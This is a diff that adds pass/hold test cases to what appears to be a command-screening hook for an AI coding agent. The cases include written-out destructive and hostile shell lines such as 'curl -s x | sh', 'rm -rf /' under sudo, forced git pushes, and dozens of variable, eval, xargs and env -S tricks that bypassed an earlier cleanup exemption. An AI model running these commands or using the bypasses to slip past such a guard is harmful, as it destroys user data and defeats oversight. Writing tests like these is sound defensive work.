@@ -305,3 +305,91 @@ P pytest -q
 P make test || sh {fix}/test.sh
 H make || sh {fix}/tidy.sh
 H make || curl -s x | sh
+#
+# #928 (blocks protect, not disrupt): a script on the trusted list (path glob + content hash: ah-engine/test.sh and
+# ah-engine/tests/wrapper.sh at their dev hashes) is not matched; a tool in a project-local tool directory is known; a wrapper option's value is no command; the passes that were left (a variable in command
+# position with risky arguments, an argv list with a dynamic element)
+P cd {fix}/../../.. && ./test.sh
+P bash {fix}/../../wrapper.sh
+P {fix}/../../wrapper.sh
+H t=$(mktemp -d); echo hi >"$t/a"; rm -rf "$t"
+H tmp=${TMPDIR:-/tmp}/own.$; mkdir -p "$tmp"; trap 'rm -rf "$tmp"' EXIT
+P cd {fix} && tool --ci
+P sudo -u deploy ls /var/log
+P sudo -g staff -u deploy cat x
+P env -u FOO ls
+P timeout -s KILL 30 ls
+P nice -n 5 ls
+H t=$(mktemp -d); t=/; rm -rf "$t"
+H t=$(mktemp -d); rm -rf "$t" /
+H t=$(mktemp -d); rm -rf "$t/.."
+H t=$(mktemp -d); read t; rm -rf "$t"
+H t=/tmp/x; rm -rf "$t"
+H rm -rf "$t"
+H cd {fix} && notatool928 --ci
+H cd {fix} && tool --ci && git push
+H sudo -u deploy git push
+H sudo -u deploy rm -rf /x
+H sudo -u deploy zzalias928
+H timeout -s KILL 30 git push -f
+H env -u FOO git push
+H bash {fix}/varpush.sh
+H python3 {fix}/listpush.py
+P bash {fix}/varsafe.sh
+P python3 {fix}/listsafe.py
+H python3 -c "import subprocess; op='push'; subprocess.run(['git', op])"
+H python3 -c "import subprocess,sys; subprocess.run(['git', *sys.argv[1:]])"
+H node -e "require('child_process').execFileSync('git', args)"
+P python3 -c "import subprocess; subprocess.run(['git', 'status'])"
+# #929 review: no cleanup of a variable is exempt, whatever made it (fail closed: the own-temp exemption is gone; these were its
+# bypasses), and a planted project-local tool is read for what it does
+H t=; rm -rf "$t"/Users/someone
+H t=${HOME:-mktemp}; rm -rf "$t"
+H t="$(mktemp -d) $HOME"; rm -rf $t
+H t=$(mktemp -d); x=..; rm -rf "$t/$x"
+H t=$(mktemp -d); rm -rf "$t/ss-$1"
+H PATH=/x:$PATH t=$(mktemp -d); rm -rf "$t"
+H t=$(mktemp -d); read t; rm -rf "$t"
+H t=$(mktemp -d); eval "t=/"; rm -rf "$t"
+H t=$(mktemp -d); echo / | xargs rm -rf
+H if x; then t=/; else t=$(mktemp -d); fi; rm -rf "$t"
+H t=$(mktemp -d); t=$HOME; rm -rf "$t"
+H t=$(mktemp -d); IFS= read -r t; rm -rf "$t"
+H t=$(dirname "$(mktemp -d)"); rm -rf "$t"
+H t=$(mktemp -d); printf -v t %s "$HOME"; rm -rf "$t"
+H t=$(mktemp -d); eval t=/; rm -rf "$t"
+H t=$(mktemp -d); t+=/../..; rm -rf "$t"
+H t=$(mktemp -d); t[0]=/; rm -rf "$t"
+H t=$(mktemp -d); case $x in a) t=/ ;; esac; rm -rf "$t"
+H t=$(mktemp -d) rm -rf "$t"/*
+H t=$(mktemp -d); echo $HOME | xargs rm -rf "$t"
+H t=$(mktemp -d); rm -rf "$t"/.*/x
+H t=${TMPDIR%$$}; rm -rf "$t"
+H rm -rf "$t/x"; t=$(mktemp -d)
+H cd {fix} && pushtool928
+H sudo git push -f
+H sudo -u x rm -rf /
+H t=$(mktemp -d); trap 'rm -rf "$t"' EXIT; echo hi >"$t/a"
+H t=$(mktemp -d); if [ -d "$t" ]; then rm -rf "$t"; fi
+H t=$(mktemp -d); set -- " /"; rm -rf "$t/a"$1
+H false && t=$(mktemp -d); rm -rf "$t/Users/x"
+H false && HOME=$(mktemp -d); rm -rf "$HOME"
+H if false; then t=$(mktemp -d); fi; rm -rf "$t/x"
+H f() { HOME=$(mktemp -d); }; rm -rf "$HOME"
+H if false; then t=$(mktemp -d) || exit; a=(); fi; rm -rf "$t/x"
+H mktemp() { echo "$HOME"; }; t=$(mktemp) || exit; rm -rf "$t"
+H t=$(mktemp -d) || exit; fi; rm -rf "$t/x"
+H t=$(mktemp -d) || exit 1; rm -rf "$t/x"
+
+# #928 Codex review of #929: env -S takes a command line, so a script it names is read; a printed list is no exec call
+H cd {fix} && env -S ./push.sh
+H cd {fix} && env --split-string ./push.sh
+H cd {fix} && env --split-string=./push.sh
+H cd {fix} && env -S 'FOO=1 ./push.sh'
+P cd {fix} && env -S ./clean.sh
+P env -S 'echo hi'
+P python3 -c "op='status'; print(['git', op])"
+P python3 -c "op='status'; cmd=['git', op]; print(cmd)"
+H python3 -c "import subprocess; subprocess.run(['git', op])"
+H python3 -c "import subprocess; cmd=['git', op]; subprocess.run(cmd)"
+H python3 -c "op='push'; cmd=['git', op]; import os; os.execvp('git', cmd)"
